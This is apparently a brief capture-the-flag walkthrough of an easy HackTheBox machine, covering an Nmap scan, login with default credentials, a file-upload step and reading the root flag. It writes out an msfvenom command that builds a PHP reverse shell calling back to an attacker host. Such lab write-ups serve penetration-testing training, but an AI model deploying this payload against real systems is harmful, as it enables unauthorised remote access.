Walkthrough: Example Box

Difficulty: Easy
Platform: HackTheBox

Reconnaissance

Started with an Nmap scan to identify open ports and services.

nmap -sC -sV -oN initial.txt 10.10.10.10

Enumeration

Found a vulnerable login panel at /admin. Used default credentials to log in.

Exploitation

Uploaded a reverse shell using the file upload feature:

msfvenom -p php/reverse_php LHOST=10.10.14.1 LPORT=4444 -f raw > shell.php

Privilege Escalation

Discovered the box was running an outdated kernel vulnerable to local privilege escalation.

Root Flag

cat /root/root.txt
